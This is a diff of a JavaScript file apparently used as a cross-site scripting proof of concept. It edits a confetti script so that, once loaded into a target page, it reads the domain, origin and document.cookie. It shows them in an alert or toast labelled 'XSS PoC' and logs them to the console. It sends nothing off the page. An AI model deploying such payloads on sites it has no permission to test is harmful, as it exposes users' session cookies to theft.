@@ -1,23 +1,24 @@
 (function(){
   'use strict';
 
-  // tryAlert attempts to show an alert and returns true if it likely ran (not blocked)
+  // Get the actual context - this works when script is loaded cross-origin
+  const currentDomain = window.location.hostname;
+  const currentCookies = document.cookie;
+  const currentOrigin = window.location.origin;
+
   function tryAlert(msg, timeoutMs){
     timeoutMs = timeoutMs || 350;
     try {
-      // Use a short timer to detect blocking; if alert blocks, the user must close it, so timer will expire before code continues.
       var fired = false;
       var t = setTimeout(function(){ fired = true; }, timeoutMs);
-      try { alert(msg); } catch(e){ clearTimeout(t); return false; }
+      try { alert("XSS PoC - " + msg); } catch(e){ clearTimeout(t); return false; }
       clearTimeout(t);
-      // If we reached here without throwing, assume alert was displayed and closed by the user
       return true;
     } catch(e){
       return false;
     }
   }
 
-  // Non-blocking toast fallback (shows small label and auto-removes)
   function showToast(text, ttl){
     ttl = typeof ttl === 'number' ? ttl : 8000;
     try {
@@ -40,7 +41,6 @@
         'transition:opacity .22s'
       ].join(';');
       document.documentElement.appendChild(d);
-      // fade in
       requestAnimationFrame(function(){ d.style.opacity = 1; });
       setTimeout(function(){
         try { d.style.opacity = 0; setTimeout(function(){ try{ d.remove(); }catch(e){} }, 240); } catch(e){}
@@ -48,7 +48,6 @@
     } catch(e){}
   }
 
-  // Confetti + centered message (keeps your original feel)
   function runConfettiAndMessage(){
     try {
       var s = document.createElement('style');
@@ -60,7 +59,7 @@
       w.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;overflow:hidden;z-index:2147483647;pointer-events:none';
       document.body.appendChild(w);
 
-      var cols = ['#c8102e','white','#3350ec']; // NL colors
+      var cols = ['#c8102e','white','#3350ec'];
       for (var i = 0; i < 220; i++){
         var e = document.createElement('div');
         e.className = 'c';
@@ -87,28 +86,31 @@
 
   // main
   try {
-    // Decide what to alert: cookie if poc_cookie=1 present in URL, otherwise domain
     var query = (location && location.search) ? location.search : '';
-    var wantCookie = /\bpoc_cookie=1\b/.test(query); // developer toggle
-    var subject = wantCookie ? (typeof document.cookie !== 'undefined' ? document.cookie : '(no-cookie)') : (typeof document.domain !== 'undefined' && document.domain ? document.domain : (location && location.hostname ? location.hostname : 'unknown'));
+    var wantCookie = /\bpoc_cookie=1\b/.test(query);
+    
+    // Use the actual context variables
+    var subject = wantCookie ? 
+      (currentCookies || '(no cookies)') : 
+      (currentDomain || 'unknown domain');
 
-    // log for triage
-    try { console.info('[confetti_nl.js] PoC run; subject=', subject, 'poc_cookie=', wantCookie, 'ts=', new Date().toISOString()); } catch(e){}
+    // Enhanced logging
+    try { 
+      console.info('[XSS PoC] Target:', currentOrigin);
+      console.info('[XSS PoC] Domain:', currentDomain);
+      console.info('[XSS PoC] Cookies:', currentCookies);
+      console.info('[XSS PoC] Displaying:', wantCookie ? 'COOKIES' : 'DOMAIN');
+    } catch(e){}
 
-    // attempt alert first (dev). If alert blocked, fallback to toast
-    var alerted = tryAlert(subject, 350);
+    var alerted = tryAlert((wantCookie ? 'COOKIES: ' : 'DOMAIN: ') + subject, 350);
     if (!alerted) {
-      // fallback: show toast and keep console evidence
-      showToast(subject + ' (PoC)');
-      try { console.info('[confetti_nl.js] alert blocked; showed toast as fallback.'); } catch(e){}
-    } else {
-      try { console.info('[confetti_nl.js] alert shown (user dismissed).'); } catch(e){}
+      showToast((wantCookie ? 'Cookies: ' : 'Domain: ') + subject);
+      try { console.info('[XSS PoC] Alert blocked; showed toast'); } catch(e){}
     }
 
-    // always show the confetti visual proof
     runConfettiAndMessage();
 
   } catch(err){
-    try { console.error('[confetti_nl.js] runtime error', err); } catch(e){}
+    try { console.error('[XSS PoC] Error:', err); } catch(e){}
   }
 })();
